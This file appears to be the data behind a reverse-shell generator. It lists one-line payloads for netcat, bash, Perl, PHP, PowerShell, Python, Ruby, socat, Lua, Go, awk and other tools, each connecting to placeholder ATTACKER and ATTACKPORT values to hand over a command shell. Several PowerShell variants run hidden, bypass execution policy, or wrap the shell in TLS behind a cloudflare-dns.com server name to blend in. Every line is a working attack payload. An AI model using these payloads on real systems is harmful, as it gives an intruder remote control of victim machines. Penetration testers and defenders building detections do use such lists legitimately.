# Netcat
#                                   Windows
windows~~nc~~nc.exe ATTACKER ATTACKPORT -e REVSHELL
windows~~ncat~~ncat.exe ATTACKER ATTACKPORT -e REVSHELL
#                                   LINUX
linux~~nc~~nc ATTACKER ATTACKPORT -e REVSHELL
linux~~nc~~nc -c REVSHELL ATTACKER ATTACKPORT
linux~~nc~~rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER ATTACKPORT >/tmp/f
linux~~ncat~~rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|REVSHELL -i 2>&1|ncat -u ATTACKER ATTACKPORT >/tmp/f
linux~~ncat~~ncat ATTACKER ATTACKPORT -e REVSHELL
#
# Rustcat
#
linux~~rcat~~rcat connect -s REVSHELL ATTACKER ATTACKPORT
#
# Bash
linux~~bash~~REVSHELL -i >& /dev/tcp/ATTACKER/ATTACKPORT 0>&1
linux~~bash~~REVSHELL -i >& /dev/udp/ATTACKER/ATTACKPORT 0>&1
#
# Sh 
linux~~sh~~REVSHELL -i >& /dev/tcp/ATTACKER/ATTACKPORT 0>&1
linux~~sh~~REVSHELL -i >& /dev/udp/ATTACKER/ATTACKPORT 0>&1
#
# Perl
linux~~perl~~perl -e 'use Socket;$i="ATTACKER";$p=ATTACKPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("REVSHELL -i");};'
linux~~perl~~perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER:ATTACKPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
#
# PHP
linux~~php~~php -r '$sock=fsockopen("ATTACKER",ATTACKPORT);exec("REVSHELL <&3 >&3 2>&3");'
linux~~php~~php -r '$sock=fsockopen("ATTACKER",ATTACKPORT);shell_exec("REVSHELL <&3 >&3 2>&3");'
linux~~php~~php -r '$sock=fsockopen("ATTACKER",ATTACKPORT);system("REVSHELL <&3 >&3 2>&3");'
linux~~php~~php -r '$sock=fsockopen("ATTACKER",ATTACKPORT);passthru("REVSHELL <&3 >&3 2>&3");'
linux~~php~~php -r '$sock=fsockopen("ATTACKER",ATTACKPORT);`REVSHELL <&3 >&3 2>&3`;'
linux~~php~~php -r '$sock=fsockopen("ATTACKER",ATTACKPORT);popen("REVSHELL <&3 >&3 2>&3", "r");'
linux~~php~~php -r '$sock=fsockopen("ATTACKER",ATTACKPORT);$proc=proc_open("REVSHELL", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
#
# PowerShell
windows~~powershell~~$LHOST = "ATTACKER"; $LPORT = ATTACKPORT; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
windows~~powershell~~powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',ATTACKPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
windows~~powershell~~powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('ATTACKER', ATTACKPORT);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
windows~~powershell~~$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('ATTACKER', ATTACKPORT);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
#
# Python
linux~~python~~export RHOST="ATTACKER";export RPORT=ATTACKPORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("REVSHELL")'
linux~~python~~python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",ATTACKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("REVSHELL")'
linux~~python~~export RHOST="ATTACKER";export RPORT=ATTACKPORT;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("REVSHELL")'
linux~~python~~python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",ATTACKPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("REVSHELL")'
linux~~python~~python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",ATTACKPORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("REVSHELL")'
#
# Ruby
linux~~ruby~~ruby -rsocket -e'spawn("REVSHELL",[:in,:out,:err]=>TCPSocket.new("ATTACKER",ATTACKPORT))'
linux~~ruby~~ruby -rsocket -e'exit if fork;c=TCPSocket.new("ATTACKER","ATTACKPORT");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
#
# Socat 
linux~~socat~~socat TCP:ATTACKER:ATTACKPORT EXEC:REVSHELL
#
# Sqlite3
linux~~sqlite3~~sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|REVSHELL -i 2>&1|nc ATTACKER ATTACKPORT >/tmp/f'
#
# Telnet
linux~~telnet~~TF=$(mktemp -u);mkfifo $TF && telnet ATTACKER ATTACKPORT 0<$TF | REVSHELL 1>$TF
#
# Zsh
linux~~zsh~~zsh -c 'zmodload zsh/net/tcp && ztcp ATTACKER ATTACKPORT && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
#
# Lua
linux~~lua~~lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER','ATTACKPORT');os.execute('REVSHELL -i <&3 >&3 2>&3');"
linux~~lua~~lua5.1 -e 'local host, port = "ATTACKER", ATTACKPORT local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
#
# Golang
linux~~golang~~echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","ATTACKER:ATTACKPORT");cmd:=exec.Command("REVSHELL");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
#
# AWK
linux~~awk~~awk 'BEGIN {s = "/inet/tcp/0/ATTACKER/ATTACKPORT"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null